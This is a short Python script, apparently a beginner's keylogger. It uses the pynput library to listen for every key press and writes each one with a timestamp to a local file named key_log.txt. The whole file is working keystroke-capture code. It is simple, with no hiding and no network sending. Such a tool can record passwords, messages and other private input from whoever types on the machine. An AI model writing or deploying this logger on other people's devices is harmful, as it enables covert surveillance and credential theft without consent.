import pynput
from pynput.keyboard import Key, Listener
import logging
#imports library to listen to keystrokes

log_dir = ""
logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format= '%(asctime)s: %(message)s')
#creates text

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
